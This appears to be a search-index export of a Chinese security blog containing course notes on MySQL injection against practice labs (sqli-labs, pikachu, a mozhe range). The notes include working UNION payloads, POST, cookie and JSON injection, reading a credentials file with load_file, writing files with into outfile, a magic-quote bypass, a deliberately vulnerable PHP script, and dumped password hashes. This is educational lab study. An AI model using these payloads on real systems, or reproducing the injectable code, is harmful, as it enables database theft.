<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</title>
    <link href="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/"/>
    <url>/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）"><a href="#【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）" class="headerlink" title="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）"></a>【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）</h2><h3 id="数据参数类型"><a href="#数据参数类型" class="headerlink" title="数据参数类型"></a>数据参数类型</h3><ol><li><p>数字型</p><p>演示案例：sqlilabs-less2</p></li><li><p>字符型</p><p>演示案例：sqlilabs-less1、3、4</p><p>less-1</p><p>less-3</p><p>?id&#x3D;-1’) union select 1,2,3 –+</p><p>less-4</p><p>?id&#x3D;-1”) union select 1,2,3 –+</p></li></ol><h3 id="注入提交方法"><a href="#注入提交方法" class="headerlink" title="注入提交方法"></a>注入提交方法</h3><p>GET,POST,COOKIE,REQUEST,HTTP 头等</p><h3 id="POST-数据提交注入测试-x3D-gt-sqlilabs-less-11"><a href="#POST-数据提交注入测试-x3D-gt-sqlilabs-less-11" class="headerlink" title="POST 数据提交注入测试&#x3D;&gt;sqlilabs less 11"></a>POST 数据提交注入测试&#x3D;&gt;sqlilabs less 11</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">uname=admin&#x27; and 1=2 union select 1,2 #&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure><img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221018220311328.png" alt="image-20221018220311328" style="zoom:80%;" /><h3 id="COOKIE-数据提交注入测试-x3D-gt-sqlilabs-less-20"><a href="#COOKIE-数据提交注入测试-x3D-gt-sqlilabs-less-20" class="headerlink" title="COOKIE 数据提交注入测试&#x3D;&gt;sqlilabs less 20"></a>COOKIE 数据提交注入测试&#x3D;&gt;sqlilabs less 20</h3><p>首先抓取登录数据包：</p><img src="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221019152825376.png" class="" title="image-20221019152825376"><p>再抓取GET请求数据包，添加Cookie字段：</p><img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221019152932561.png" alt="image-20221019152932561" style="zoom: 80%;" /><img src="【小迪安全】WEB漏洞-SQL注入之类型及提交注入（十四）/image-20221019153020229.png" alt="image-20221019153020229" style="zoom:80%;" /><h3 id="HTTP-头部参数数据注入测试-x3D-gt-sqlilabs-less-18"><a href="#HTTP-头部参数数据注入测试-x3D-gt-sqlilabs-less-18" class="headerlink" title="HTTP 头部参数数据注入测试&#x3D;&gt;sqlilabs less 18"></a>HTTP 头部参数数据注入测试&#x3D;&gt;sqlilabs less 18</h3><h3 id="参数-JSON-数据注入测试-x3D-gt-本地环境代码演示"><a href="#参数-JSON-数据注入测试-x3D-gt-本地环境代码演示" class="headerlink" title="参数 JSON 数据注入测试&#x3D;&gt;本地环境代码演示"></a>参数 JSON 数据注入测试&#x3D;&gt;本地环境代码演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#配合 sqlilabs 本地数据库演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>]))&#123;<br><span class="hljs-variable">$json_str</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;json&#x27;</span>];<br><span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json_str</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$json</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;JSON 文档格式有误，请检查&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$json</span>-&gt;username;<br><span class="hljs-comment">//$passwd=$json-&gt;passwd;</span><br><span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>();<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;connect_errno)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;数据库连接失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">select_db</span>(<span class="hljs-string">&#x27;security&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$mysqli</span>-&gt;errno)&#123;<br><span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-string">&#x27;打开数据库失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>&#125;<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">set_charset</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;执行 SQL 语句失败：&#x27;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows==<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;查询结果为空&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$array1</span>=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名：<span class="hljs-subst">&#123;$array1[0][&#x27;username&#x27;]&#125;</span>,密码：<span class="hljs-subst">&#123;$array1[0][&#x27;password&#x27;]&#125;</span>&quot;</span>;<br>&#125;<br><span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">free</span>();<br><span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>json&#x3D;{“username”:”Dumb’ and 1&#x3D;2 union select 1,database(),3#”}</p><img src="/2022/10/17/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89/image-20221017212346052.png" class="">]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</title>
    <link href="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/"/>
    <url>/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）"><a href="#【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）" class="headerlink" title="【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）"></a>【小迪安全】WEB漏洞-SQL注入之MYSQL注入（十三）</h2><h3 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h3><p>高权限用户与数据库权限有绝对的关系，高权限的用户可以访问到除自己的数据库以外的其他数据库。这就是高权限注入（跨库注入）的原理。</p><p>跨库查询示例：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abnf">网站A<span class="hljs-operator">=</span>用户A<span class="hljs-operator">=</span>数据库A<br><br>表名<br><br>  列名<br><br>数据<br><br>网站B<span class="hljs-operator">=</span>用户B<span class="hljs-operator">=</span>数据库B<br><br>网站C<span class="hljs-operator">=</span>用户C<span class="hljs-operator">=</span>数据库C<br></code></pre></td></tr></table></figure><h3 id="sql-labs-less2-演示"><a href="#sql-labs-less2-演示" class="headerlink" title="sql-labs-less2 演示"></a>sql-labs-less2 演示</h3><p>获取所有数据库名：</p><p>information_schema下有一张记录系统所有数据库名的表schemata，可以通过查询schema_name字段查询到当前系统的所有数据库。</p><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013085226422.png" class="" title="image-20221013085226422"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>获取指定 pikachu数据库名下的表名信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-comment">--+</span><br>httpinfo,member,message,users,xssblind<br></code></pre></td></tr></table></figure><p>获取指定 pikachu下的表名users 下的列名信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;pikachu&#x27;</span><span class="hljs-comment">--+</span><br>id,username,<span class="hljs-keyword">password</span>,<span class="hljs-keyword">level</span><br></code></pre></td></tr></table></figure><p>获取指定 pikachu 下的 users数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> pikachu.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> <span class="hljs-comment">--+</span><br>Your <span class="hljs-keyword">Login</span> <span class="hljs-type">name</span>:<span class="hljs-keyword">admin</span><br>Your <span class="hljs-keyword">Password</span>:e10adc3949ba59abbe56e057f20f883e <br></code></pre></td></tr></table></figure><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013090152715.png" class="" title="image-20221013090152715"><h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><ul><li><p>load_file()：读取函数</p></li><li><p>into outfile 或 into dumpfile ：导出函数</p></li></ul><h3 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h3><p>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</p><h3 id="读取文件信息"><a href="#读取文件信息" class="headerlink" title="读取文件信息"></a>读取文件信息</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">union select <span class="hljs-number">1</span>,load<span class="hljs-constructor">_file(&#x27;D:\\<span class="hljs-params">phpstudy_pro</span>\\WWW\\<span class="hljs-params">sqli</span>-<span class="hljs-params">labs</span>-<span class="hljs-params">master</span>\\<span class="hljs-params">sql</span>-<span class="hljs-params">connections</span>\\<span class="hljs-params">db</span>-<span class="hljs-params">creds</span>.<span class="hljs-params">inc</span>&#x27;)</span>,<span class="hljs-number">3</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --+ <br></code></pre></td></tr></table></figure><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013101723977.png" class=""><h3 id="写入文件信息"><a href="#写入文件信息" class="headerlink" title="写入文件信息"></a>写入文件信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile &quot;D:\\x.php&quot; <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="魔术引号及常见防护"><a href="#魔术引号及常见防护" class="headerlink" title="魔术引号及常见防护"></a>魔术引号及常见防护</h3><p>当magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。</p><h3 id="如何绕过魔术引号？"><a href="#如何绕过魔术引号？" class="headerlink" title="如何绕过魔术引号？"></a>如何绕过魔术引号？</h3><p>把注入语句中的文件路径进行16进制编码，再写入into outfile函数里面注入。</p><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013222601025.png" class="" title="image-20221013222601025"><h3 id="SQL语句过滤"><a href="#SQL语句过滤" class="headerlink" title="SQL语句过滤"></a>SQL语句过滤</h3><ul><li><p>str_replace函数：str_replace(select,fuck,$id)</p></li><li><p>自带防御：魔术引号</p></li><li><p>内置函数：int等</p></li><li><p>自定义关键字：select等</p></li><li><p>WAF防护软件：安全狗，宝塔等</p></li></ul><h3 id="WAF绕过简述"><a href="#WAF绕过简述" class="headerlink" title="WAF绕过简述"></a>WAF绕过简述</h3><img src="/2022/10/13/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%B8%89%EF%BC%89/image-20221013194305805-1665670793410-2.png" class="">]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）</title>
    <link href="/2022/10/11/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/10/11/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）"><a href="#【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）" class="headerlink" title="【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）"></a><strong>【小迪安全】WEB漏洞-SQL注入之简要SQL注入（十二）</strong></h2><p>[TOC]</p><h3 id="SQl注入产生的原因：以下三个原因缺一不可"><a href="#SQl注入产生的原因：以下三个原因缺一不可" class="headerlink" title="SQl注入产生的原因：以下三个原因缺一不可"></a>SQl注入产生的原因：以下三个原因缺一不可</h3><ul><li>可控变量：php语句中存在可以传入的变量值</li><li>带入数据库查询：SQL语句在拼接完后又带入数据库执行</li><li>变量未存在过滤或过滤不严谨</li></ul><h3 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h3><ul><li><p>信息收集：操作系统、数据库名、数据库用户、数据库版本、其他（网站路径等）</p></li><li><p>数据注入：同数据库分为低版本和高版本。低版本可以通过暴力查询或者结合读取查询；高版本可以通过information_schema有据查询。</p></li><li><p>高权限注入：常规查询、跨库查询、文件读写。</p></li></ul><h3 id="如何判断有无注入点？"><a href="#如何判断有无注入点？" class="headerlink" title="如何判断有无注入点？"></a>如何判断有无注入点？</h3><ul><li>老方法：and 1&#x3D;1 页面正常   and 1&#x3D;2 页面异常  从而判断有注入点</li><li><u>好方法：直接在网站变量传入后面输入其他混乱字符，从页面返回的信息是否异常判断出，SQL语句是否带入数据库查询，进而判断出有无注入点</u>。</li><li>例外情况：使用混乱字符进行测试的时候页面出现404错误或者直接跳转的情况，这种情况是网站对你输出的数据进行了检测和过滤，一般不存在注入点。</li></ul><img src="/2022/10/11/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89/image-20221011111805773.png" class="" title="image-20221011111805773"><h3 id="必要知识点："><a href="#必要知识点：" class="headerlink" title="必要知识点："></a>必要知识点：</h3><ol><li><p>在MYsql5.0版本以上，存在一个名为information_schema的记录所有数据库、表名、列名数据的数据库，相当于可以通过查询它获取指定数据库下面的表名或列名信息。</p></li><li><p>在数据库中符号“.”代表下一级，如xiao.user表示xiao数据库下的user表。</p></li><li><p>SQL语句中一些用法：</p><ul><li><p>information_schema.tables:查询指定数据库中的所有表名</p></li><li><p>information_schama.columns:查询指定数据库中的所有列名</p></li><li><p>table_name:表名</p></li><li><p>column_name:列名</p></li><li><p>table_schama:在information_schema中指定查询的数据库名</p></li></ul></li></ol><h3 id="SQL手工注入流程（基本流程适合所有类型的SQL注入）："><a href="#SQL手工注入流程（基本流程适合所有类型的SQL注入）：" class="headerlink" title="SQL手工注入流程（基本流程适合所有类型的SQL注入）："></a>SQL手工注入流程（基本流程适合所有类型的SQL注入）：</h3><p>判断注入</p><p>猜解列名数量（字段） </p><ul><li>order by x （x为错误与正常临界点）</li><li>id&#x3D;-1 union select 1,2,3，…，x 或者 id&#x3D;1 and 1&#x3D;1 union select 1，…，x</li></ul><p>信息收集（使用union select）</p><ul><li>数据库版本：version()</li><li>数据库名：database()</li><li>数据库用户：user()</li><li>操作系统@@version_compile_os</li></ul><p>​union select 1,version(),database(),@@version_compile_os –+</p><p>查询指定数据库下所有表名信息：</p><p>​?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;’指定数据库’</p><p>查询指定表下所有列名信息：</p><p>​?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;’指定表名’</p><p>查询指定表名下的数据：</p><p>​?id&#x3D;-1 union select 1,name,password,4  from StormGroup_member limit 1,1</p><h3 id="实际操作案例：mozhe靶场"><a href="#实际操作案例：mozhe靶场" class="headerlink" title="实际操作案例：mozhe靶场"></a>实际操作案例：mozhe靶场</h3><p>​<a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe</a></p><p>猜解字段：</p><p>​<a href="http://124.70.22.208:41689/new_list.php?id=1">http://124.70.22.208:41689/new_list.php?id=1</a> order by 4  正常</p><p>​<a href="http://124.70.22.208:41689/new_list.php?id=1">http://124.70.22.208:41689/new_list.php?id=1</a> order by 5 异常</p><p>字段为4</p><p>联合查询——信息收集：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">union select <span class="hljs-number">1</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-built_in">database</span>(),@<span class="hljs-keyword">@version</span>_compile_os <br></code></pre></td></tr></table></figure><p>查询指定数据库mozhe_Discuz_StormGroup下的所有表名信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">124.70</span><span class="hljs-number">.22</span><span class="hljs-number">.208</span>:<span class="hljs-number">41689</span>/new_list.php?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;mozhe_Discuz_StormGroup&#x27;</span><br></code></pre></td></tr></table></figure><p>表的信息：StormGroup_member,notice</p><p>查询指定表StormGroup_member下的所有列名信息：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">124.70</span><span class="hljs-number">.22</span><span class="hljs-number">.208</span>:<span class="hljs-number">41689</span>/new_list.php?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;StormGroup_member&#x27;</span><br></code></pre></td></tr></table></figure><p>列的信息：id,name,password,status</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">124.70</span><span class="hljs-number">.22</span><span class="hljs-number">.208</span>:<span class="hljs-number">41689</span>/new_list.php?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;notice&#x27;</span><br></code></pre></td></tr></table></figure><p>列名信息：id,title,content,time</p><p>查询指定数据：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">124.70.22.208:41689</span>/new_list.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,name,password,<span class="hljs-number">4</span>  from StormGroup_member limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>​name:mozhe password:356f589a7df439f6f744ff19bb8092c0(dsan13)</p><p>​name:mozhe password:a5c8ca5313c748785fc6d55f7227a73c(431529)</p><img src="/2022/10/11/%E3%80%90%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%91WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%AE%80%E8%A6%81SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89/image-20221011110822593.png" class="" title="image-20221011110822593">]]></content>
    
    
    <categories>
      
      <category>网络安全技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow新手杯wp（部分）</title>
    <link href="/2022/10/10/ctfshow%E6%96%B0%E6%89%8B%E6%9D%AFwp/"/>
    <url>/2022/10/10/ctfshow%E6%96%B0%E6%89%8B%E6%9D%AFwp/</url>
    
